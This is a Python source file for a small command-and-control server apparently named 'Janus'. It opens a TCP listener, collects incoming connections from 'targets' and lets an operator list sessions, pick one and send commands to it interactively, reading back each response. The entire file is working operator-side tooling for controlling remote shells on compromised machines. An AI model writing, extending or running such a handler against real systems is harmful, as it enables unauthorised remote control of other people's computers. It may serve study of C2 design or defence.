import socket
import sys
import threading

def banner(): 
    print('   __     ______     __   __     __  __     ______             ')
    print('  /\ \   /\  __ \   /\ "-.\ \   /\ \/\ \   /\  ___\            ')
    print(' _\_\ \  \ \  __ \  \ \ \-.  \  \ \ \_\ \  \ \___  \           ') 
    print('/\_____\  \ \_\ \_\  \ \_\ "\_\  \ \_____\  \/\_____\          ')
    print('\/_____/   \/_/\/_/   \/_/ \/_/   \/_____/   \/_____/  by  rg\n')
                                                      
#Function to Handle Incoming Messages
def comm_in(targ_id):
     print('[+] Awaiting response...')
     response = targ_id.recv(1024).decode()
     return response

#Function to Handle Outgoing Messages
def comm_out(targ_id, message):
    message = str(message)
    targ_id.send(message.encode())

def target_comm(targ_id):
    while True:
        message = input('Send Message > ')
        comm_out(targ_id, message)
        if message == 'exit':
            targ_id.send(message.encode())
            targ_id.close()
            break
        if message == 'background' or message == 'bg':
            break
        else:
            response = comm_in(targ_id)
            if response == 'exit':
                print(f'[!] {targ_id} has terminated the session.')
                targ_id.close()
                break
            print(response)

#Listener Handler Function
def listener_handler():
    sock.bind((host_ip, host_port))
    print('[+] Server ready for client connection(s)...')
    sock.listen()
    t1 = threading.Thread(target=comm_handler)
    t1.start()

#Communication Handler Function
def comm_handler():
    while True:
        if kill_flag == 1:
            break
        try:
            remote_target, remote_ip = sock.accept()
            targets.append([remote_target, remote_ip[0]])
            print(f'\n[+] Connection received from {remote_ip[0]}\n' + 'Command > ', end="")
        except:
            pass

#Main
if __name__ == '__main__':
    targets = []
    banner()
    kill_flag = 0
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        host_ip=sys.argv[1]
        host_port=int(sys.argv[2])
    except IndexError:
        print('Command line argument(s) missing. Expecting IPv4 Address and Port Number. Please try again.')
    except Exception as e:
        print(e)
    listener_handler()
    while True:
        try:
            command = input('Command > ')
            if command.split(" ")[0] == 'sessions': #Add another if for -h or help.
                session_counter = 0
                if command.split(" ")[1] == '-l':
                    print ('Session' + ' ' * 10 + 'Target')
                    for target in targets:
                        print(str(session_counter) + ' ' * 16 + target[1])#Why start this at 1? Why not 0? Need to review target command.
                        session_counter += 1
                if command.split(" ")[1] == '-i':
                    num = int(command.split(" ")[2])
                    targ_id = (targets[num])[0]
                    target_comm(targ_id)
        except KeyboardInterrupt:
            print('\n[!] Keyboard interrupt issued.')
            kill_flag = 1
            sock.close()
            break